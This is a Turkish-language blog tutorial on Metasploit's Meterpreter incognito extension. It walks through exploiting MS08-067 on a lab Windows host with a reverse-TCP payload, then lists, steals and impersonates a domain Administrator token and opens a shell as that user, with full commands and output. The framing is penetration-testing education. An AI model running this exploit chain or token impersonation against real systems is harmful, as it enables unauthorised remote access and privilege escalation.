---
title: MSF Incognito
layout: post
date: 2017-05-25 09:03:06.000000000 +02:00
type: post
author: siberoloji
img: metasploit.jpg
published: true
status: publish
categories:
- Nasıl
- Araştırma
tags:
- msfconsole
- metasploit Framework
- Metasploit Framework incognito
- msf meterpreter incognito modülü
excerpt: Bir sisteme giriş yaptığınızda, sistemde bulunan kullanıcılara ait **token** adı verilen izin ve yetkilendirme kuralları bulunur. Bu kurallar, web uygulamalarında kullanılan **cookie** denilen çerez dosyalarına benzer. Kullanıcı ağdaki bir servise (örn. Net drive) ilk bağlandığında kullanıcı adı ve parolasıyla oturum açar. Oturum açıldığında sistem bu kullanıcıya bir **token** tanımlar.
---

# Incognito Nedir?

Bir sisteme giriş yaptığınızda, sistemde bulunan kullanıcılara ait **token** adı verilen izin ve yetkilendirme kuralları bulunur. Bu kurallar, web uygulamalarında kullanılan **cookie** denilen çerez dosyalarına benzer. Kullanıcı ağdaki bir servise (örn. Net drive) ilk bağlandığında kullanıcı adı ve parolasıyla oturum açar. Oturum açıldığında sistem bu kullanıcıya bir **token** tanımlar. Artık bilgisayar kapanana kadar tekrar tekrar parola girmeden, sistemde bulunan servisi kullanma imkanı olacaktır.

Pentest işlemleri esnasında bu **token** ve yetkilerini ele geçirerek kullanmaya **incognito** işlemi denilmektedir. **token** izinleri, ikiye ayrılmaktadır. Bunlara __delegate__ ve __impersonate__ adı verilmektedir. Okuyucunun kafasının karışmaması için biz de İngilizce şekillerini kullanmaya devam edeceğiz. 

Delegate: token izinleri beyan ediciler olarak kullanılır. Etkileşimli oturumlarda, örneğin uzak masaüstü bağlantıları tarzında işlemler için kullanılırlar.

Impersonate: token izinleri kişisel olarak üretilmiş izinlerdir ve etkileşim olmayan servisler için kullanılırlar. Örneğin bir ağ klasörüne bağlanmak gibi.

> Dosya sunucuları bu token izinleri için çok zengin bir bilgi kaynağıdırlar.

Hedef sistemde bir token ele geçirdiğinizde, artık bir servise bağlanmak için o kullanıcının parolasını bilmeye gerek kalmaz çünkü yetkilendirme önceden yapılmıştır ve yetki kontrolü **token** iznine güvenilerek arka planda yapılır. Bir sistemde meterpreter shell açıldığında kullanılabilir durumda olan **token** listesi kontrol edilmelidir.

## Meterpreter Oturum Açalım

Aşağıdaki örnekte, öncelikle ```ms08_067_netapi``` modülü kullanılarak gerekli ayarlar yapılmakta ve bir oturum açılmaktadır.

```sh
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set RHOST 10.211.55.140
RHOST => 10.211.55.140
msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(ms08_067_netapi) > set LHOST 10.211.55.162
LHOST => 10.211.55.162
msf exploit(ms08_067_netapi) > set LANG english
LANG => english
msf exploit(ms08_067_netapi) > show targets

Exploit targets:

   Id  Name                                               
   --  ----                                               
   0   Automatic Targeting                                
   1   Windows 2000 Universal                             
   2   Windows XP SP0/SP1 Universal                       
   3   Windows XP SP2 English (NX)                        
   4   Windows XP SP3 English (NX)                        
   5   Windows 2003 SP0 Universal                         
   6   Windows 2003 SP1 English (NO NX)                   
   7   Windows 2003 SP1 English (NX)                      
   8   Windows 2003 SP2 English (NO NX)                   
   9   Windows 2003 SP2 English (NX)                      
   10  Windows XP SP2 Arabic (NX)                         
   11  Windows XP SP2 Chinese - Traditional / Taiwan (NX) 


msf exploit(ms08_067_netapi) > set TARGET 8
target => 8
msf exploit(ms08_067_netapi) > exploit

[*] Handler binding to LHOST 0.0.0.0
[*] Started reverse handler
[*] Triggering the vulnerability...
[*] Transmitting intermediate stager for over-sized stage...(191 bytes)
[*] Sending stage (2650 bytes)
[*] Sleeping before handling stage...
[*] Uploading DLL (75787 bytes)...
[*] Upload completed.
[*] Meterpreter session 1 opened (10.211.55.162:4444 -> 10.211.55.140:1028)

meterpreter >
```

## Incognito Modülünü Yükleyelim

Meterpreter oturumu açmayı başardıktan sonra ```incognito``` modülünü kullanmamız gerekiyor. ```Incognito``` modülü, meterpreter e ait bir modül olduğundan ```use incognito``` komutuyla modülü aktif hale getiriyoruz. Ardından ```help``` komutunu verdiğinizde, ```incognito``` modülüne özel komutları görebiliriz.

```sh
meterpreter > use incognito
Loading extension incognito...success.
meterpreter > help

Incognito Commands
==================

    Command              Description                                             
    -------              -----------                                             
    add_group_user       Attempt to add a user to a global group with all tokens 
    add_localgroup_user  Attempt to add a user to a local group with all tokens  
    add_user             Attempt to add a user with all tokens                   
    impersonate_token    Impersonate specified token                             
    list_tokens          List tokens available under current user context        
    snarf_hashes         Snarf challenge/response hashes for every token         

meterpreter >
```

## Sistemdeki token Listesi

Meterpreter içerisinde ```incognito``` modülünü yükledikten sonra ```list_tokens``` komutuyla listeyi kontrol edelim. Listede bulunan bir takım **token** izinlerine Administrator kullanıcılarının bile erişimi olmayabilir. Bizim en fazla ilgileneceğimiz tür **SYSTEM** token izinleridir.

```sh
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
SNEAKS.IN\Administrator

Impersonation Tokens Available
========================================
NT AUTHORITY\ANONYMOUS LOGON

meterpreter >
```

Yukarıda listede bulunan ```SNEAKS.IN\Administrator``` isimli token fark ettiyseniz **Delegation** listesinde bulunmaktadır. Bunu **Impersonation** haline getirerek kişiselleştirmeniz gerekmektedir. Bunun için ```impersonate_token``` komutunu kullanacağız. Komutu girerken iki adet ```\\``` işareti kullanmaya dikkat edin. Listede ```\``` tek olsa da komutu girerken iki adet girilmelidir. 

```sh
meterpreter > impersonate_token SNEAKS.IN\\Administrator
[+] Delegation token available
[+] Successfully impersonated user SNEAKS.IN\Administrator
meterpreter > getuid
Server username: SNEAKS.IN\Administrator
meterpreter >
```
Komut başarıyla sonlandığında ```getuid``` komutuyla kullanıcı kimliğini kontrol ettiğimizde ```Server username: SNEAKS.IN\Administrator``` sonucu aldık. 

## Yeni Kullacı ile Shell Açma

Meterpreter içerisinde ```execute -f cmd.exe -i -t``` komutu ile komut satırında oturum açalım ve ```whoami``` komutuyla Windows kullanıcı kimliğine bakalım. Burada ```-i``` seçeneği **interact*** yani etkileşimli, ```-t``` seçeneği ise yeni ele geçirdiğimiz ```SNEAKS.IN\Administrator``` token iznini kullanmayı ifade eder. 

```sh
meterpreter > shell
Process 2804 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32> whoami
whoami
SNEAKS.IN\administrator

C:\WINDOWS\system32>
```

Kişisel bilgisayarlarda karşılaşabileceğiniz **token** izinlerine, sunucu bilgisayarlarda daha çok rast gelebilirsiniz. Sunucularda bir çok servis etkileşimli ve çok kullanıcılı olarak çalıştığından liste daha uzun olacaktır. Bunların arasından en çok yetkili **token** izinleri denemelisiniz.